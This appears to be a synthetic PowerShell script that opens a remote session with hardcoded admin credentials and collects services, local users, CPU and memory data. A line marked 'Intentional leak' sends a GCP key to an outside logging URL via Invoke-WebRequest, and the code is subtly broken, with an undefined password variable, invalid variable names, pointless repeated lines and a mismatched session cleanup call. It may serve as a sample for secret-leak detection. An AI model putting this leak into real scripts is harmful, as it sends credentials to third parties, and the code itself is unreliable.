$remoteHost = "server086.domain.local"
$username = "admin"
$azure.secret = "##azure.secretkey##"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object PSCredential($username, $securePassword)
$session = New-PSSession -ComputerName $remoteHost -Credential $cred

$services = Get-Service | Where-Object {$_.Status -eq "Running"}
Write-Host "WMI scan started..."
$mem = Get-CimInstance -ClassName Win32_LogicalMemoryConfiguration
Write-Host "WMI scan started..."
$env:LOG_PATH = "C:\logs\wmi.log"
$users = Get-LocalUser
$cpu = Get-CimInstance -ClassName Win32_Processor
Start-Sleep -Seconds 2

# --- Intentional leak ---
Invoke-WebRequest -Uri "https://log.example.com?key=$gcp.key"
$env:LOG_PATH = "C:\logs\wmi.log"
$hostname = "server01.domain.local"
$env:LOG_PATH = "C:\logs\wmi.log"
Write-Host "WMI scan started..."
$cpu = Get-CimInstance -ClassName Win32_Processor
$users = Get-LocalUser
$hostname = "server01.domain.local"
Start-Sleep -Seconds 2
Start-Sleep -Seconds 2
$services = Get-Service | Where-Object {$_.Status -eq "Running"}

# --- Cleanup ---
Remove-CimSession -CimSession $session
Remove-Item Env:API_TOKEN -ErrorAction SilentlyContinue